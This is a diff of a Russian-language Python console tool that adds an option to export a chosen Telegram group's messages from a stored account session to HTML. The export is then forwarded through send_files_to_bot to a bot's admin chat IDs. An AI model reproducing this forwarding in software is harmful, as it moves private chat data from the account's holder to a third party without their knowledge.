@@ -100,7 +100,67 @@ if __name__ == "__main__":
            print()
            input("\033[93mНажмите Enter для продолжения...\033[0m")             
            client.disconnect()
-           
+
+# Выгрузка сообщений из групп в HTML
+        elif selection in ['70', '75']:
+            os.system('cls||clear')
+            exit_flag = False
+            flag_user_dialogs = False
+            while not exit_flag:
+              os.system('cls||clear')
+              sessions = []
+              header = '''
+   -----------------------------
+   =ВЫГРУЗКА СООБЩЕНИЙ ЧАТА=
+   -----------------------------
+              '''
+              result = choice_akk(api_id, api_hash, header)
+              if result is None:
+                  break
+              os.system('cls||clear')
+              client, phone, session_index = result
+              print('-----------------------------') 
+              userid, userinfo, firstname, lastname, username, photos_user_html = get_user_info(client, phone, selection) # Получение информации о пользователe
+              i = 0
+              while True:
+                   os.system('cls||clear')
+                   print('-----------------------------')
+                   print('=ВЫГРУЗКА СООБЩЕНИЙ ЧАТА=')
+                   print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
+                   print('-----------------------------')
+                   if flag_user_dialogs == False:
+                      groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html= make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
+                   print_pages(all_info, 40)
+                   print('-----------------------------')
+                   print()
+                   i=i
+                   g_index_str = str(input("\033[92mВыберите пользователя для получения списка его участников ('e' - назад): \033[0m"))
+                   if g_index_str.lower() == 'e':
+                      client.disconnect()
+                      exit_flag = True
+                      break
+                   else:
+                      try:
+                          g_index = int(g_index_str)
+                          if 0 <= g_index < i:
+                              target_group = groups[int(g_index)]
+                              get_messages_from_group(client, target_group, selection)
+                              print()
+                              send_files_to_bot(bot, admin_chat_ids)
+                              client.disconnect()
+                              exit_flag = True
+                              break
+                          else:
+                              print("Пожалуйста, выберите пользователя из списка")
+                              time.sleep(2)
+                              all_info = []
+                              os.system('cls||clear')
+                      except ValueError:
+                           print("Пожалуйста, выберите пользователя из списка")
+                           time.sleep(2)
+                           all_info = []
+                           os.system('cls||clear')
+                         
 # Выгрузка личных сообщений
         elif selection in ['40', '45', '450']:
             os.system('cls||clear')
